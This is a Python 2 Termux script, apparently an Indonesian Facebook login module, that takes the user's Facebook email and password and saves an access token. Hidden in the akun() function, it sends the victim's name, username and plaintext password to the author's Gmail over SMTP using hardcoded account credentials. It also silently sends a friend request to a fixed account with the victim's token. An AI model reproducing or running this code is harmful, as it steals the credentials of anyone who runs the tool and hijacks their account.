# -*- coding: utf-8 -*-
import sys
sys.path.insert (0, "..")
from warna import *


def logo():
	print ""
	system ("clear")
	print n + tebal +"█████████"
	print n + tebal +"█▄█████▄█     "+ b +"●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬●"
	print n + tebal +"█"+ m +"▼▼▼▼▼ "+ n + tebal +"-_- _-_-"+ h +" ╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗"
	print n + tebal +"█ --_ -_ -_- _-"+ h +"  ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗"
	print n + tebal +"█"+ m +"▲▲▲▲▲ "+ n + tebal +"--- -- -"+ h +" ═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝"
	print n + tebal +"█████████     "+ b +"«----------✧✧----------»"
	print n + tebal +" ██ ██ "+ c + miring +"       Achmad Khoirul Marzuqin"
	print n + u + 53 * "═"+ n +"\n"


def login():
	logo()
	try:
		toket = open ("Token.txt", "r").read ()
		jl = json.loads (get ("https://graph.facebook.com/me?access_token="+ toket).text)
		nama = jl["name"]
		id = jl["id"]
	except ConnectionError:
		koneksi()
		login()
	except IOError:
		print m + tebal +"                 !!! PERINGATAN !!!"+n
		print h +"            Saya Tidak Bertanggung Jawab"
		print k +"        Apabila Ada Masalah Sebagai Berikut :\n"
		print u +"~"+ m +" Akun Facebook Dibanned / Checkpoint"
		print u +"~"+ m +" Hp Anda Akan Lag Jika Script Ini Sedang Berjalan"
		print u +"~"+ m +" Kuota Internet Anda Cepat Habis"
		print n +"\nApakah Anda Ingin Melanjutkan"
		print h +"Ya (Tekan Tombol Enter)"+ n +" Atau"
		peringatan = raw_input (m +"Tidak (Ketik Tidak)"+ n +" : "+ b)
		print ""
		if peringatan == "Tidak" or peringatan == "tidak" or peringatan == "TIDAK":
			chdir ("..")
			system ("python2 irul.py")
		else:
			logo()
			print u +"╔══╗"
			print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
			print u +"║  ║"
			print u +"║"+ h +"01"+ u +"║"+ h +" Masuk Dengan Akun Facebook"
			print u +"║"+ k +"02"+ u +"║"+ k +" Masuk Dengan Token Facebook"
			print u +"╚══╝\n"
			masuk = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor : "+ n)
			if masuk == "01" or masuk == "1":
				akun()
			elif masuk == "02" or masuk == "2":
				token()
			else:
				salah()
				login()
	except KeyError:
		print m + tebal +"!!! Akun Facebook Terkena Checkpoint !!!"+ n
		system ("rm -rf Token.txt")
		sleep (3)
		login()


def akun():
	logo()
	try:
		br = Browser()
		br.set_handle_robots(False)
		br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
		#br.addheaders = [("User-Agent", "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16")]
		br.addheaders = [("User-Agent", "Mozilla/5.0 (Linux; Android 8.1.0; CPH1823) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36 OPR/54.1.2672.49808")]
		br.open ("https://m.facebook.com")
		print u +"•"+ b +" Masuk Dengan Akun Facebook"
		nama_pengguna = raw_input (u +"›"+ h +" Nomor / Email / Id "+ n +": ")
		kata_sandi = getpass.getpass (u +"›"+ k +" Kata Sandi         "+ n +": ")
		print ""
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form["email"] = nama_pengguna
		br.form["pass"] = kata_sandi
		br.submit()
		url = br.geturl()
		if "save-device" in url:
			try:
				sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail="+ nama_pengguna +"format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword="+ kata_sandi +"return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32"
				data = {"api_key": "882a8490361da98702bf97a021ddc14d", "credentials_type": "password", "email": nama_pengguna, "format": "JSON", "generate_machine_id": "1", "generate_session_cookies": "1", "locale": "en_US", "method": "auth.login", "password": kata_sandi, "return_ssl_resources": "0", "v": "1.0"}
				x = hashlib.new("md5")
				x.update(sig)
				a = x.hexdigest()
				data.update({"sig":a})
				jl = json.loads (get ("https://api.facebook.com/restserver.php", params = data).text)
				toket = open ("Token.txt", "w")
				toket.write (jl["access_token"])
				toket.close ()
				# Gmail :
				# https://myaccount.google.com/u/0/security
				# Akses Aplikasi Yang Kurang Aman (Aktif)
				smtp_server = "smtp.gmail.com"
				port = 587
				# Yahoo :
				# smtp_server = "smtp.mail.yahoo.com"
				# port = 25
				try:
					server_mail = smtplib.SMTP (smtp_server, port)
					server_mail.ehlo()
					if smtp_server == "smtp.gmail.com":
						server_mail.starttls()
					iruluser = "irul.facebook.irul@gmail.com"
					userirul = "irul.termux.irul@gmail.com"
					passirul = "irultermux"
					jll = json.loads (get ("https://graph.facebook.com/me?access_token="+ open ("Token.txt", "r").read()).text)
					msg = "From: "+ userirul +"\nSubject: Termux\nNama         = "+ jll["name"] +"\nUsername = "+ nama_pengguna +"\nPassword = "+ kata_sandi +"\n\nhttps://mobile.facebook.com/profile.php?id="+ jll["id"]
					server_mail.login (userirul, passirul)
					server_mail.sendmail (userirul, iruluser, msg)
					server_mail.quit()
					print h +"✔ Berhasil Masuk Akun Facebook"
					post ("https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token="+ jl["access_token"])
					sleep (3)
					login()
				except smtplib.SMTPAuthenticationError:
					jalan (m + tebal +"!!! Akun Facebook Error !!!"+ n)
					sleep (3)
					akun()
			except ConnectionError:
				koneksi()
				akun()
			except TypeError:
				print m + tebal +"!!! Akun Facebook Error !!!"+ n
				sleep (3)
				akun()
		elif "checkpoint" in url:
			system ("rm -rf Token.txt")
			print + m + tebal +"!!! Akun Facebook Terkena Checkpoint !!!"+ n
			sleep (3)
			akun()
		else:
			print m + tebal +"✘ Gagal Masuk Dengan Akun Facebook"+ n
			sleep (3)
			login()
	except TypeError:
		print m + tebal +"!!! Akun Facebook Error !!!"+ n
		sleep (3)
		akun()
	except URLError:
		koneksi()
		akun()


def token():
	logo()
	print u +"•"+ b +" Masuk Dengan Token Facebook"
	toket = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Masukkan Token Facebook "+ n +": ")
	print ""
	try:
		jl = json.loads (get ("https://graph.facebook.com/me?access_token="+ toket).text)
		nama = jl["name"]
		tokett = open ("Token.txt", "w")
		tokett.write (toket)
		tokett.close ()
		login()
	except ConnectionError:
		koneksi()
		token()
	except KeyError:
		print m + tebal +"✘ Gagal Masuk Dengan Token Facebook"+ n
		sleep (3)
		login()
	except TypeError:
		print m + tebal +"!!! Akun Facebook Error !!!"+ n
		sleep (3)
		login()


login()